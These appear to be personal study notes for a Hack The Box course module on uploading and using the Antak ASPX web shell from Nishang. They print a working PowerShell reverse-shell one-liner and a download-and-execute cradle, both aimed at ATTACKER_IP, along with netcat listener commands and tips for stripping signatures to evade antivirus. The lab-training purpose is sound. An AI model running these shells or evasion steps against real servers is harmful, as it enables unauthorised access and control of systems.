# 🎓 Quick Learning Tip (Very Important)

Before diving into ASPX shells, remember:

> It is good to supplement reading with watching demonstrations and performing hands-on as we have been doing thus far.

A powerful resource:

### 🔎 IPPSEC (ippsec.rocks)

![Image](https://ippsec.rocks/holidayhack2016/assets/part-4/ad-meteor-2.png)

![Image](https://forum.hackthebox.com/uploads/default/optimized/3X/c/c/ccc763a5ed88b2ef71b3bb03e70eaf9715b9c2c1_2_1024x576.jpeg)

![Image](https://miro.medium.com/v2/resize%3Afit%3A1400/1%2Aet32-6GizdYkXu4jfo0iTw.png)

![Image](https://academy.hackthebox.com/storage/modules/136/logo.png)

IPPSEC’s site allows you to:

- Search for keywords like **aspx**
    
- Jump directly to timestamps in his videos
    
- Watch real-world demonstrations
    

Example:  
Search: `aspx`  
Result: Timestamp where ASPX upload and execution is demonstrated.

---

# 🧠 What is ASPX?

### Definition (Keep Important Concept)

**Active Server Page Extended (ASPX)** is a file type written for Microsoft’s ASP.NET Framework.

On an ASP.NET web server:

- User input → processed server-side
    
- Converted to HTML
    
- Sent back to browser
    

⚠️ Because processing happens server-side, we can:

- Inject ASPX web shells
    
- Execute Windows commands
    
- Control the underlying Windows OS
    

---

# 🐚 What is Antak?

![Image](https://miro.medium.com/v2/resize%3Afit%3A1400/0%2Aw_pCLddHmK9zLy4D.png)

![Image](https://opengraph.githubassets.com/341c51a50cb2108c148deb5c807016998f0491352ddaa6ed2973b6ba4c5ddcb9/samratashok/nishang)

![Image](https://img2.helpnetsecurity.com/posts/nishang.jpg)

![Image](https://www.kali.org/tools/nishang/images/nishang-logo.svg)

### Definition (Keep Important)

**Antak is a web shell built in ASP.Net included within the Nishang project.**

Nishang = Offensive PowerShell toolset.

Antak:

- Uses PowerShell backend
    
- Looks like PowerShell console
    
- Executes each command as a new process
    
- Can encode commands
    
- Can execute scripts in memory
    
- Can upload/download files
    

---

# 📁 Antak Location (Important)

```bash
ls /usr/share/nishang/Antak-WebShell
```

Output:

```bash
antak.aspx
Readme.md
```

---

# ⚙️ Working with Antak

---

## Step 1️⃣ Copy Antak Shell

```bash
cp /usr/share/nishang/Antak-WebShell/antak.aspx /home/administrator/Upload.aspx
```

---

## Step 2️⃣ Modify Credentials (VERY IMPORTANT)

Open file:

```bash
nano Upload.aspx
```

Modify line 14:

Original:

```csharp
if (username == "Disclaimer" && password == "ForLegitUseOnly")
```

Change to:

```csharp
if (username == "htb-student" && password == "StrongPassword123")
```

### Why this matters:

|Reason|Explanation|
|---|---|
|Security|Prevent random access|
|OPSEC|Protect your shell|
|Control|Limit to attacker only|

---

## ⚠️ OPSEC Tip

Remove:

- ASCII art
    
- Comments
    
- Obvious signatures
    

Why?

|Risk|Explanation|
|---|---|
|AV detection|Known patterns|
|Defender alerts|Signature-based detection|

---

# 📤 Upload Antak

Upload via vulnerable upload form.

Example:

```text
Upload.aspx
```

Stored in:

```text
\\files\Upload.aspx
```

Navigate to:

```text
http://status.inlanefreight.local/files/Upload.aspx
```

---

# 🔐 Login Prompt

Antak presents login page.

Enter credentials set earlier.

If correct → access granted.

---

# 🖥️ Antak Interface Features

Antak behaves like PowerShell.

You can:

|Feature|Function|
|---|---|
|Submit|Execute PowerShell commands|
|Browse|File browsing|
|Upload|Upload files|
|Download|Download files|
|Encode & Execute|Encode commands|
|Execute SQL Query|Database interaction|
|Parse web.config|Extract configuration|

---

# 🧪 Executing Commands

Basic enumeration:

```powershell
whoami
```

```powershell
hostname
```

```powershell
systeminfo
```

```powershell
dir C:\Users
```

---

# 📡 Deliver Reverse Shell from Antak

Start listener:

```bash
nc -lvnp 4444
```

Execute in Antak:

```powershell
powershell -c "IEX(New-Object Net.WebClient).DownloadString('http://ATTACKER_IP/shell.ps1')"
```

Or direct one-liner:

```powershell
powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('ATTACKER_IP',4444);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes,0,$bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0,$i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"
```

---

# 🔥 Antak vs Laudanum

|Feature|Antak|Laudanum|
|---|---|---|
|Backend|PowerShell|Multiple|
|UI|PowerShell-themed|Basic|
|Credential Protection|Yes|IP-based|
|Encode support|Yes|Limited|
|Windows optimized|Yes|Generic|

---

# 🎯 Attack Workflow

```text
Find upload vulnerability
        ↓
Copy antak.aspx
        ↓
Modify credentials
        ↓
Upload file
        ↓
Navigate to shell
        ↓
Login
        ↓
Execute PowerShell commands
        ↓
Deploy reverse shell
        ↓
Privilege escalation
```

---

# 🔎 Important Commands to Run First

```powershell
whoami
```

```powershell
systeminfo
```

```powershell
ipconfig
```

```powershell
dir C:\Users
```

```powershell
Get-Process
```

---

# 🧠 Key Takeaways

✔ ASPX runs on IIS / Windows  
✔ Antak uses PowerShell backend  
✔ Must modify credentials  
✔ Each command runs in new process  
✔ Can encode and execute scripts  
✔ Excellent for Windows web servers

---

# 🐚 Antak Webshell Cheat Sheet (HTB / CPTS / OSCP)

---

# 📁 Location

|Task|Command|
|---|---|
|Locate Antak|`ls /usr/share/nishang/Antak-WebShell`|
|View file|`cat /usr/share/nishang/Antak-WebShell/antak.aspx`|

---

# 📋 Copy for Modification

```bash
cp /usr/share/nishang/Antak-WebShell/antak.aspx Upload.aspx
```

---

# ✏️ Modify Credentials (IMPORTANT)

Open file:

```bash
nano Upload.aspx
```

Find this line:

```csharp
if (username == "Disclaimer" && password == "ForLegitUseOnly")
```

Change to:

```csharp
if (username == "htb-student" && password == "StrongPassword123")
```

✔ Prevents unauthorized access  
✔ Required before upload

---

# 📤 Upload Antak

Upload via:

- File upload vulnerability
    
- FTP
    
- WebDAV
    
- Admin panel
    

Common storage location:

```
/files/Upload.aspx
```

Access:

```
http://target/files/Upload.aspx
```

---

# 🔐 Login

Enter credentials you set in the file.

---

# 🖥️ Basic Commands (Run First)

|Command|Purpose|
|---|---|
|`whoami`|Current user|
|`hostname`|Machine name|
|`systeminfo`|OS details|
|`ipconfig`|Network info|
|`dir`|List directory|
|`Get-Process`|Running processes|
|`Get-Service`|Services|

---

# 📂 File Enumeration

|Command|Purpose|
|---|---|
|`dir C:\`|Root listing|
|`dir C:\Users`|User accounts|
|`dir C:\inetpub\wwwroot`|Webroot|
|`type web.config`|Read config file|

---

# 📡 Reverse Shell from Antak

## 1️⃣ Start Listener

```bash
nc -lvnp 4444
```

---

## 2️⃣ PowerShell Reverse Shell (Simple)

```powershell
powershell -c "IEX(New-Object Net.WebClient).DownloadString('http://ATTACKER_IP/shell.ps1')"
```

---

## 3️⃣ PowerShell Reverse Shell (One-liner)

```powershell
powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('ATTACKER_IP',4444);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes,0,$bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0,$i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"
```

---

# 📦 Upload & Download Files

|Task|Command|
|---|---|
|Download file|Use **Download** button|
|Upload file|Use **Upload the File** button|
|Manual download|`Invoke-WebRequest`|

Example:

```powershell
Invoke-WebRequest http://ATTACKER_IP/file.exe -OutFile file.exe
```

---

# 🔐 Privilege Escalation Checks

|Command|Purpose|
|---|---|
|`whoami /priv`|Privileges|
|`whoami /groups`|Group membership|
|`net user`|Users|
|`net localgroup administrators`|Admins|
|`Get-Process`|High privilege processes|
|`Get-Service`|Service misconfigs|

---

# 🎯 Quick Escalation Checks

```powershell
whoami
```

```powershell
systeminfo
```

```powershell
whoami /priv
```

```powershell
net localgroup administrators
```

---

# 🧠 Antak Features

|Feature|Description|
|---|---|
|PowerShell-based|Native Windows interaction|
|Credential protection|Login required|
|Encode & Execute|Run encoded payloads|
|Upload/Download|File transfer|
|Execute SQL|DB interaction|
|Parse web.config|Extract credentials|

---

# 🔥 Attack Workflow

|Step|Action|
|---|---|
|1|Find upload vulnerability|
|2|Copy antak.aspx|
|3|Modify credentials|
|4|Upload shell|
|5|Navigate to file|
|6|Login|
|7|Run enumeration|
|8|Deploy reverse shell|
|9|Privilege escalation|

---

# 🏆 Most Important Commands (Memorize)

```bash
cp /usr/share/nishang/Antak-WebShell/antak.aspx .
```

```bash
nc -lvnp 4444
```

```powershell
whoami
```

```powershell
systeminfo
```

```powershell
whoami /priv
```

```powershell
net localgroup administrators
```

---

# ⚠️ OPSEC Tips

|Tip|Reason|
|---|---|
|Remove ASCII art|Avoid AV signature|
|Rename file|Avoid detection|
|Use encoded payloads|Evasion|
|Upgrade to reverse shell|More stable access|

---

### Excersises

![[Pasted image 20260228235643.png]]

Steps for the answers

Step1. The answer to the first question is in the segment itself.

Step2. Same As the previous module.Opening machine, terminal and VPN.

Step3. We have ran the Nmap scan to know the open ports of the machine and we have seen that Http server port is open and port number is also suspicious and we will exploit this. On the other hand we also have know which OS is running on Target System.
![[Pasted image 20260301000541.png]]

Step4. Now we will set hostname in hosts file.
![[Pasted image 20260220090305.png]]

Step5. now we will surf the website for which the hostname is set for.
![[Pasted image 20260220090536.png]]                                    ![[Pasted image 20260220090717.png]]
